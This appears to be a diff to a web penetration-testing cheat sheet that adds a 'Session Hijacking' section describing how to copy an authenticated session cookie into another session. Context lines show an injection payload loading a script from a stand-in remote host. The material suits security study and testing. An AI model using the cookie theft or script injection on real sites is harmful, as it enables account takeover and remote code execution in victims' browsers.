@@ -24,10 +24,11 @@ Overview
 20. - [Insecure Direct Object References (IDOR)](#20---insecure-direct-object-references-idor)
 21. - [XML External Entity (XXE) Injection](#21---xml-external-entity-xxe-injection)
 22. - [File Inclusion](#22---file-inclusion)
-23. - [Sensitive Data Exposure](#23---sensitive-data-exposure)
-24. - [HTML Injection](#24---html-injection)
-25. - [Cross-Site Request Forgery (CSRF)](#25---cross-site-request-forgery-csrf)
-26. - [Exploit Research](#26---exploit-research)
+23. - [Session Hijacking](#23---session-hijacking)
+24. - [Sensitive Data Exposure](#24---sensitive-data-exposure)
+25. - [HTML Injection](#25---html-injection)
+26. - [Cross-Site Request Forgery (CSRF)](#26---cross-site-request-forgery-csrf)
+27. - [Exploit Research](#27---exploit-research)
    
 #1. - Web Requests
 -----------------------------------------
@@ -1641,7 +1642,16 @@ https://github.com/OsandaMalith/LFiFreak
 https://github.com/mzfr/liffy
 ```
 
-#23. - Sensitive Data Exposure
+#23. - Session Hijacking
+-----------------------------------------
+
+- Steal Cookie
+
+```
+Open Dev Tools -> Storage -> Copy Cookie Value from Authenticated Session -> Paste Cookie Value into Unauthenticated Session
+```
+
+#24. - Sensitive Data Exposure
 -----------------------------------------
 
 - Source Code
@@ -1652,7 +1662,7 @@ OR
 CTRL + U
 ```
 
-#24. - HTML Injection
+#25. - HTML Injection
 -----------------------------------------
 
 - Hyperlink
@@ -1662,7 +1672,7 @@ CTRL + U
 ```
 
 
-#25. - Cross-Site Request Forgery (CSRF)
+#26. - Cross-Site Request Forgery (CSRF)
 -----------------------------------------
 
 - Password Change
@@ -1671,7 +1681,7 @@ CTRL + U
 "><script src=//www.example.com/exploit.js></script>
 ```
 
-#26. - Exploit Research
+#27. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
